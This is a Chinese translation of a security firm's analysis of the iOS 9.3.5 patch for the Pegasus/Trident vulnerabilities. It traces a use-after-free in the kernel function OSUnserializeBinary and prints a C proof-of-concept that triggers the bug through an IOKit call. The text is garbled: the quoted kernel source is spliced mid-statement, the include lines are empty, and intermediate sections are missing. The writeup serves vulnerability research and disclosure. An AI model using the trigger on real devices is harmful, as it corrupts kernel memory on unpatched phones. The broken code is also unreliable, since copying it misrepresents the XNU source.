# iOS三叉戟漏洞补丁分析、利用代码 公布（POC）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**  
**
**1.介绍**
2016年8月25日,针对最近出现的iOS监视工具PEGASUS,苹果发布了重要的安全更新:iOS
9.3.5。与之前发现的iOS恶意软件不同，这个工具包使用了三个不同的iOS 0 day漏洞，可以让所有打了补丁(iOS
9.3.5之前的版本)的iOS设备妥协。不幸的是，有关这些漏洞的公开信息很少,这是因为Citizenlab and Lookout
(漏洞发现者)和苹果已经决定对公众隐瞒细节。直到此时,他们仍没有向公众公开恶意软件样本，因此，独立地进行第三方分析是不可能完成的。
站在SektionEins的立场，我们认为向公众隐瞒已修复漏洞的细节并非正确的做法,由于我们在解决iOS内核问题上比较专业,于是决定来看看苹果发布的安全补丁,以找出被PEGASUS利用的漏洞。
该事件前期相关报道、报告：
[iOS 9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日
13:41更新）](http://bobao.360.cn/news/detail/3497.html "iOS
9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日 13:41更新）")
**2.补丁分析**
事实上，分析iOS安全补丁并没有我们当初想象得那么简单，因为iOS
9内核是以加密的形式被存储在设备中的(在固件文件中)。如果想获取解密后的内核，我们有两个选择：一种是拥有一个允许解密内核的低水平利用,另一种是破解存在问题的iOS版本,然后从核心内存里将它转储出来。我们决定使用第二种方法，我们在实验室内的iOS测试设备中，用自己的破解版本转储了iOS
9.3.4和iOS 9.3.5的内核。Mathew Solnik曾在一篇博客文章中对我们通常的做法有所描述,他透露说,
通过内核利用，我们可以从物理内存中转储完全解密的iOS内核。
转储出两个内核后，我们需要分析它们的差异。我们使用IDA中的开源二进制diffing插件Diaphora来完成这个任务，为了进行比较，我们将iOS
9.3.4内核加载到了IDA,然后等待自动分析完成，然后运用Diaphora将当前IDA数据库以同样的格式转储到SQLITE数据库。对于iOS
9.3.5内核，我们重复了一次这个过程,然后命令Diaphora比较两个数据库的差异。比较的结果可在以下的画面中看到：
Diaphora发现了iOS
9.3.5中的一些新函数。然而,其中大多数只是跳转目标发生了变化。从变动函数的列表中，我们可以明显看出OSUnserializeXML是其中最值得探究的函数。分析该函数的差异是非常困难的,因为相较于iOS
9.3.4，这个函数在iOS
9.3.5中已经发生了很大的改变(由于重新排序)。然而进一步的分析显示,它实际上还内联着另一个函数,通过观察XNU（类似于iOS内核）的源代码，找到漏洞似乎会变得较为容易。OS
X 10.11.6内的XNU内核可以在opensource.apple.com上找到。
对代码进行调查后显示,内联函数实际上是OSUnserializeBinary。
    OSObject*
    OSUnserializeXML(const char *buffer, size_t bufferSize, OSString **errorString)
    {
            if (!buffer) return (0);
            if (bufferSize = v##Capacity)                                                                                                         
            {
                    uint32_t ncap = v##Capacity + 64;
                    typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));
                    if (!nbuf) ok = false;
                    if (v##Array)
                    {
                            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));
                            kfree(v##Array, v##Capacity * sizeof(o));
                    }
                    v##Array    = nbuf;
                    v##Capacity = ncap;
            }
            if (ok) v##Array[idx] = o;   getCStringNoCopy(), o->getMetaClass()->getClassName());
                    if (o != dict) ok = dict->setObject(sym, o, true);
                    o->release();
                    sym->release();
                    sym = 0;
            }
            else
            {
                    sym = OSDynamicCast(OSSymbol, o);
                    if (!sym && (str = OSDynamicCast(OSString, o)))
                    {
                        sym = (OSSymbol *) OSSymbol::withString(str);
                        o->release();  
    #include 
    #include 
    #include 
    #include 
    #include 
    enum
    {
      kOSSerializeDictionary   = 0x01000000U,
      kOSSerializeArray        = 0x02000000U,
      kOSSerializeSet          = 0x03000000U,
      kOSSerializeNumber       = 0x04000000U,
      kOSSerializeSymbol       = 0x08000000U,
      kOSSerializeString       = 0x09000000U,
      kOSSerializeData         = 0x0a000000U,
      kOSSerializeBoolean      = 0x0b000000U,
      kOSSerializeObject       = 0x0c000000U,
      kOSSerializeTypeMask     = 0x7F000000U,
      kOSSerializeDataMask     = 0x00FFFFFFU,
      kOSSerializeEndCollecton = 0x80000000U,
    };
    #define kOSSerializeBinarySignature "323"
    int main()
    {
      char * data = malloc(1024);
      uint32_t * ptr = (uint32_t *) data;
      uint32_t bufpos = 0;
      mach_port_t master = 0, res;
      kern_return_t kr;
      /* create header */
      memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
      bufpos += sizeof(kOSSerializeBinarySignature);
      /* create a dictionary with 2 elements */
      *(uint32_t *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | 2; bufpos += 4;
      /* our key is a OSString object */
      *(uint32_t *)(data+bufpos) = kOSSerializeString | 7; bufpos += 4;
      *(uint32_t *)(data+bufpos) = 0x41414141; bufpos += 4;
      *(uint32_t *)(data+bufpos) = 0x00414141; bufpos += 4;
      /* our data is a simple boolean */
      *(uint32_t *)(data+bufpos) = kOSSerializeBoolean | 64; bufpos += 4;
      /* now create a reference to object 1 which is the OSString object that was just freed */
      *(uint32_t *)(data+bufpos) = kOSSerializeObject | 1; bufpos += 4;
      /* get a master port for IOKit API */
      host_get_io_master(mach_host_self(), &master);
      /* trigger the bug */
      kr = io_service_get_matching_services_bin(master, data, bufpos, &res);
      printf("kr: 0x%xn", kr);
    }
**6.利用**
因为我们才刚刚分析了这个问题，所以还没有来得及对这个漏洞开发出一种利用。但是我们随后会为这个漏洞开发出一种完全可行的利用，今年的晚些时候，我们会在柏林的iOS内核开发培训课程上将它展示出来。
该事件前期相关报道、报告：
[iOS 9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日
13:41更新）](http://bobao.360.cn/news/detail/3497.html "iOS
9.3.5紧急发布背后真相:NSO使用iPhone 0day无需点击远程攻破苹果手机（8月26日 13:41更新）")